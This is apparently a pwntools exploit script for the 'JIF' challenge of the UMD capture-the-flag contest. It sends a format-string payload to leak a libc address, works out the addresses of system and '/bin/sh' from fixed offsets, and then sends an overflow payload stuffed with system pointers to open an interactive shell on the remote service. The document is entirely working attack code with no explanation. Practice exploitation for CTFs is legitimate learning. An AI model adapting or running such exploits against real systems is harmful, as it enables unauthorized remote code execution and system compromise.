from pwn import *

#p = process("./JIF")
p = remote("chals5.umdctf.io" ,7002)
elf = ELF("./JIF")



#gdb.attach(p)
payload = b"5\x00"
payload = payload.ljust(0xfa,b'A')
payload += b'|%p|'*60
p.sendlineafter(">",payload)
leak = int(p.recvuntil("f7||0x1||")[-19:-7],16)
system = leak + 0x2d959
binsh = leak + 0x192223

print("leak : " + hex(leak))
payload = b"1\x00"
payload = payload.ljust(0x110,b'A')
payload += b'/bin/sh\x00'
payload = payload.ljust(0x220,b';')
payload += p64(system)*10

p.sendlineafter(">",payload)


p.interactive()